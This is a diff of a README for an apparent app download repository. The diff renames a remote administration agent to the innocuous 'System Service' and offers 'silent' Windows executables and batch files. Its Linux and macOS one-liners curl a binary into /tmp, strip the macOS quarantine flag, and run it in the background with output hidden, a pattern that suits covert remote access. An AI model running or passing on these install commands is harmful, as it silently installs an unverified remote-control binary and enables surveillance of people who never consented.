@@ -13,7 +13,7 @@ Central distribution hub, binary release repository, and direct download center.
 | App Name | Category | Version | Direct Download Links |
 | :--- | :--- | :--- | :--- |
 | **Minor Monitor** | Parental Control & Diagnostics | `v1.2.7` | [📥 Download APK (v1.2.7)](https://github.com/satyamkumar420/apps-vault/releases/download/v1.2.7/app-release.apk) \| [Release Notes](https://github.com/satyamkumar420/apps-vault/releases/tag/v1.2.7) |
-| **Remote Manager Agent** | Cross-Platform Remote Administration | `v2.0.0` | **Windows:** [📥 Silent EXE](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/agent-windows-silent.exe) · [📥 Debug EXE](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/agent-windows-debug.exe) · [📜 Silent BAT](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/run-silent.bat)<br/>**Linux:** [📥 x86_64 (amd64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/agent-linux-amd64) · [📥 ARM64](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/agent-linux-arm64)<br/>**macOS:** [📥 Apple Silicon (arm64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/agent-darwin-arm64) · [📥 Intel (amd64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/agent-darwin-amd64) |
+| **System Service** | Cross-Platform Background Remote Service | `v2.0.0` | **Windows:** [📥 Silent EXE](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/system-service-windows-silent.exe) · [📥 Debug EXE](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/system-service-windows-debug.exe) · [📜 Silent BAT](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/run-silent.bat)<br/>**Linux:** [📥 x86_64 (amd64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/system-service-linux-amd64) · [📥 ARM64](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/system-service-linux-arm64)<br/>**macOS:** [📥 Apple Silicon (arm64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-arm64) · [📥 Intel (amd64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-amd64) |
 
 ---
 
@@ -32,7 +32,7 @@ irm https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-ma
 
 ### 🐧 Linux (1-Liner Bash)
 ```bash
-curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/agent-linux-amd64 -o /tmp/remote-manager-agent && chmod +x /tmp/remote-manager-agent && (/tmp/remote-manager-agent >/dev/null 2>&1 &)
+curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/system-service-linux-amd64 -o /tmp/system-service && chmod +x /tmp/system-service && (/tmp/system-service >/dev/null 2>&1 &)
 ```
 
 ---
@@ -40,7 +40,7 @@ curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/rem
 ### 🍏 macOS (1-Liner Terminal)
 ```bash
 # Apple Silicon (M1/M2/M3/M4)
-curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/agent-darwin-arm64 -o /tmp/remote-manager-agent && chmod +x /tmp/remote-manager-agent && xattr -c /tmp/remote-manager-agent && (/tmp/remote-manager-agent >/dev/null 2>&1 &)
+curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-arm64 -o /tmp/system-service && chmod +x /tmp/system-service && xattr -c /tmp/system-service && (/tmp/system-service >/dev/null 2>&1 &)
 ```
 
 ---
